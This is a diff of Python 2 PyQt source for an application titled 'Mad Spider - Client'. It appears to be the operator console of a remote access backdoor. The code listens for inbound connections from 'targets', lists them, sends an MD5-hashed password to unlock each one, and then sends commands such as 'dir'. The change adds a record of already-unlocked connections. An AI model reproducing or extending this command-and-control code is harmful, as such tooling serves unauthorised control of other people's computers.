@@ -170,6 +170,7 @@ class MainDialog(QWidget, gui.Ui_Form):
         # Initializing variables
         self.socks = []
         self.sockItems = []
+        self.unlockedSocks = []
         self.counter = 0
         self.socketsList.clear()
         self.commandLine.setText('')
@@ -185,45 +186,40 @@ class MainDialog(QWidget, gui.Ui_Form):
     # accept connections
     # add to socketlist widget
     def listenConnections(self, port):
-        #self.statusok('Initializing socket', self.lineno())
+
         # Initializing socket
         self.c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # telling the OS that you know what you're doing and you still want to bind to the same port
         self.c.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        #self.statusok('Bind address >> {}:{}'.format(self.server, port), self.lineno())
+
         # Bind address
         self.c.bind((self.server, int(port)))
-        #self.statusok('Start listen for connections', self.lineno())
+
         # Start listen for connections
         self.c.listen(128)
         while self.acceptthreadState == True:
             try:
-                #self.statusok('Try accept connection', self.lineno())
+
                 # Try accept connection
                 self.s, self.a = self.c.accept()
             except:
-                #self.statusno('No connection detected', self.lineno())
+
                 continue
 
             if self.acceptthreadState == False:
-                #self.statusno('Stoped listening for connections', self.lineno())
                 return
             if self.s:
 
-                #self.statusok('Set timeout None', self.lineno())
                 # Set timeout None
                 self.s.settimeout(self.timeout)
 
-                #self.statusok('Save connected socket', self.lineno())
                 # Save connected socket
                 self.socks += [self.s]
 
-                #self.statusok('Save connected address', self.lineno())
                 # Save connected address
                 self.sockItems += [self.a]
                 self.counter += 1
 
-                #self.statusok('Add connection to servers list', self.lineno())
                 # Add connection to servers list
                 itm = QListWidgetItem('[-%s-]  %s' % (str(self.counter), self.a[0]))
                 itm.setIcon(QIcon(r'assets/tick.png'))
@@ -235,45 +231,57 @@ class MainDialog(QWidget, gui.Ui_Form):
     # connect to client
     def connectSocket(self):
 
+        # Update server index
+        try:
+            self.sockind = int(self.socketsList.currentItem().text().split('-')[1]) - 1
+        except:
+            return
+
+        self.active = True
+
         # Ask Password
         while 1:
-            dlg = QInputDialog(self)
-            dlg.setInputMode(QInputDialog.TextInput)
-            dlg.setWindowTitle('Password Protection')
-            dlg.setLabelText('Enter Password: ')
-            dlg.setOkButtonText('Login')
-            dlg.setStyleSheet(style.popupDialog)
-            ok = dlg.exec_()
+            if self.sockind not in self.unlockedSocks:
+                dlg = QInputDialog(self)
+                dlg.setInputMode(QInputDialog.TextInput)
+                dlg.setWindowTitle('Password Protection')
+                dlg.setLabelText('Enter Password: ')
+                dlg.setOkButtonText('Login')
+                dlg.setStyleSheet(style.popupDialog)
+                ok = dlg.exec_()
 
-            if str(dlg.textValue()) != '':
-                _hash = hashlib.md5()
-                _hash.update( str(dlg.textValue()))
-                self.Send(_hash.hexdigest())
+                if str(dlg.textValue()) != '':
+                    _hash = hashlib.md5()
+                    _hash.update(str(dlg.textValue()))
+                    self.Send(_hash.hexdigest())
 
-                try:
-                    self.data = self.Receive()
+            else:
+                self.Send('dir')
 
-                    if self.data != '':
-                        if self.data == 'Access Denied':
-                            self.displayText(header='Access Denied')
-                            self.socks[self.sockind].close()
-                            self.active = False
-                            continue
-                        else:
-                            self.active = True
-                            self.displayText(msg=self.data.split('[ENDOFMESSAGE]')[0])
-                            self.setWindowTitle('Mad Spider - Client - Connected to %s' % str(self.sockItems[self.sockind]))
-                            self.tabWidget.setEnabled(True)
-                            break
-                except socket.error:
-                    self.statusno('Error while recieve message from target', self.lineno())
-                    self.statusok('Close connection', self.lineno())
-                    # Error while recieve message from target
-                    self.socks[self.sockind].close()
-                    time.sleep(0.8)
-                    self.active = False
-                    break
+            try:
+                self.data = self.Receive()
+
+                if self.data != '':
+                    if self.data == 'Access Denied':
+                        self.displayText(header='Access Denied')
+                        continue
+                    else:
+                        print self.data
+                        self.active = True
+                        self.displayText(msg=self.data.split('[ENDOFMESSAGE]')[0])
+                        self.setWindowTitle('Mad Spider - Client - Connected to %s' % str(self.sockItems[self.sockind]))
+                        self.tabWidget.setEnabled(True)
+                        self.unlockedSocks.append(self.sockind)
+                        break
+            except socket.error:
+                self.statusno('Error while recieve message from target', self.lineno())
+                self.statusok('Close connection', self.lineno())
+                # Error while recieve message from target
+                self.socks[self.sockind].close()
+                time.sleep(0.8)
+                self.active = False
                 break
+            break
 
     # while close program, connect himself for shutdown socket
     def closeEvent(self, event):
